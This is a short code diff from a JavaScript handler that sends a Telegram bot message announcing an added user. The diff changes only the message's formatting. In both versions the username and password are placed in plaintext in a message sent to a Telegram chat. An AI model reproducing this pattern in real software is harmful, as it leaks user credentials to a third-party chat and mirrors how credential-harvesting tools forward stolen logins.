@@ -36,7 +36,7 @@ export default async function handler(req, res) {
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         chat_id: chatId,
-                        text: `✅ *USER ADDED (PERMANENT)*\n👤 User: ${u}\n🔑 Pass: ${p}`,
+                        text: `✅ *USER ADDED*\n👤 User: \`${u}\`\n🔑 Pass: \`${p}\`\n\nDatabase sync complete.`,
                         parse_mode: 'Markdown'
                     })
                 });
